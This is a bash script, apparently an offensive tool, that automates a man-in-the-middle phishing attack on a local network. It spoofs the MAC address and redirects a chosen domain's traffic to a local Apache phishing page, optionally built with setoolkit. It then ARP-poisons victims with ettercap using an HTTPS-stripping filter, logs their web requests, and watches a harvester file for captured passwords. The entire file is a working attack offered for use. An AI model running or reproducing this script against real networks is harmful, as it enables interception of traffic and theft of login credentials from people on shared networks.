#! /bin/bash

ROOT_FOLDER=.

YELLOW="\033[01;33m"
GREEN="\033[01;32m"
RED="\033[01;31m"
ENDCOLOR="\033[0m"

# function for color rendering
function echolor {
	echo -e${3} "${!1}${2}${ENDCOLOR}"
}

clear
echolor "RED" "----------------------------------------------"
echolor "RED" "   --==MITM attack with website phishing==--   "
echolor "RED" "----------------------------------------------"
echo

# Checking is root
if [ $(id -u) -ne 0 ]; then
	echolor "RED" "You'd better be root! Exiting..."
	exit
fi

#####################################
# flushing routing configuration
#####################################
echolor "RED" "[+] Flushing ip forwarding"
echo "0" > /proc/sys/net/ipv4/ip_forward

echolor "RED" "[+] Flushing iptables"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

#####################################
# getting name for log dir
#####################################
echo
echolor "YELLOW" "Name of 'Session'? (name of the folder that will be created with all the log files): " n
read -e SESSION
mkdir -p ${ROOT_FOLDER}/${SESSION}
echo

#####################################
# interfaces
#####################################
echolor "RED" "[+] Discovering interfaces"
ip a | grep 'state' | awk '{print $2,"\t",$8,"\t",$9}' | column -t

echolor "YELLOW" "Please enter your interface: " n
read -e IFACE
echo

#####################################
# set up for the attack
#####################################
echolor "YELLOW" "Do you wanna spoof MAC @ ? [yYnN]: " n
read -e ISMAC
if [ ${ISMAC,,}"X" = "yX" ]; then
	echolor "RED" "[+] Generating random mac address"
	ifconfig ${IFACE} down
	macchanger -r ${IFACE}
	ifconfig ${IFACE} up
	echolor "RED" "[+] DHCP Request"
	dhclient -v
	sleep 2
fi
echo

# Getting network info
SUBNET=$(ip addr show wlan0 | sed -n '3{p;q;}' | awk '{print $2}')
IPADDR=$(echo ${SUBNET} | cut -d / -f 1)

echolor "YELLOW" "Which domain do you wish to redirect ?: " n
read -e DOMAIN_REDIRECTED
echo

# Setting DNAT rule for redirecting domain trafic to our apache server
echolor "RED" "[+] Setting up DNAT iptables rule"
echo "iptables -t nat -A PREROUTING -p tcp --dport 80 -d ${DOMAIN_REDIRECTED} -j DNAT --to-destination ${IPADDR}:8080"
iptables -t nat -A PREROUTING -p tcp --dport 80 -d ${DOMAIN_REDIRECTED} -j DNAT --to-destination ${IPADDR}:8080
echo

#####################################
# phising configuration
#####################################
echolor "RED" "[+] Setting up website phishing"
echolor "YELLOW" "Do you wanna run setoolkit ? [yYnN]: " n
read -e ISSET
if [ ${ISSET,,}"X" = "yX" ]; then
	echolor "RED" "When asking for destination ip (post.php) please type '${DOMAIN_REDIRECTED}'"
	xterm -geometry 100x25+1+200 -T setoolkit -hold -e setoolkit
fi
echo

echolor "RED" "[+] Starting apache2 service"
service apache2 restart
echo

#####################################
# discovering targets
#####################################
echolor "RED" "[+] Net discovering"
echolor "YELLOW" "Do you wanna netdiscovering ? [yYnN]: " n
read -e ISNETDISCOVER
if [ ${ISNETDISCOVER,,}"X" = "yX" ]; then
	netdiscover -i ${IFACE} -r ${SUBNET} -P
	sleep 1
fi
echo

echolor "RED" "[+] Routing information"
route -n
GATEWAY=$(route -n | sed -n '3{p;q;}' | awk '{print $2}')
sleep 1
echo

echolor "YELLOW" "Enter target1 ip: " n
read -e TARGET1

echolor "YELLOW" "Enter target2 ip [press enter for default gateway ${GATEWAY}]: " n
read -e TARGET2
echo

if [ -z ${TARGET2} ]; then
	TARGET2=${GATEWAY}
fi

# Saving victim (target1) mac @
MACVICTIM=$(arping -i ${IFACE} -C 1 ${TARGET1} | grep from | awk '{print $4}')

#####################################
# mitm
#####################################
echolor "RED" "[+] Running MITM attack..."
etterfilter ${ROOT_FOLDER}/https_strip.filter -o ${ROOT_FOLDER}/https_strip.ef > /dev/null
echo

xterm -geometry 100x25+1+200 -T "ettercap mitm" -hold -e ettercap -T -S -q -i ${IFACE} -F ${ROOT_FOLDER}/https_strip.ef -w ${ROOT_FOLDER}/${SESSION}/ettercap-raw.pcap -L ${ROOT_FOLDER}/${SESSION}/ettercap-log -M arp:remote /${TARGET2}// /${TARGET1}// &
sleep 3

echolor "RED" "/!\ Please check poisoning is OK by typing 'P', then 'chk_poison'"
echolor "RED" "Command for protected gateway: ";

echolor "RED" "dhcping -c ${TARGET1} -h ${MACVICTIM} -s ${GATEWAY} -r -v"
echo

#####################################
# urlsnarf
#####################################
echolor "RED" "[+] Starting GET/POST logging...";
urlsnarf -i ${IFACE} > ${ROOT_FOLDER}/${SESSION}/urlsnarf.txt &
xterm -geometry 100x25+1+300 -T "tail -200f ${ROOT_FOLDER}/${SESSION}/urlsnarf.txt" -hold -e tail -200f ${ROOT_FOLDER}/${SESSION}/urlsnarf.txt &
sleep 1
echo

echolor "RED" "[+] Looking for credentials...";
xterm -geometry 100x25+1+400 -T "tail -200f /var/www/html/harvester.txt" -hold -e tail -200f /var/www/html/harvester.txt &
sleep 1
echo

# Waiting for the end
while [ ${WISH,,}"X" != "qX" ]; do
	echolor "RED" "[+] IMPORTANT..."
	echolor "RED" "After the job please close this script and clean up properly by hitting 'qQ'"
	read -e WISH
done;
echo

#####################################
# clean up
#####################################
echolor "RED" "[+] Cleaning up and resetting iptables..."
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
if [ ${ISMAC,,}"X" = "yX" ]; then
	ifconfig ${IFACE} down
	macchanger -p ${IFACE}
	ifconfig ${IFACE} up
	dhclient -v
	sleep 2 
fi
xterm -geometry 100x25+1+200 -T "etterlog -a ${ROOT_FOLDER}/${SESSION}/ettercap-log.eci" -hold -e etterlog -a ${ROOT_FOLDER}/${SESSION}/ettercap-log.eci &

echolor "GREEN" "[+] Clean up successful... See Ya!" 
exit

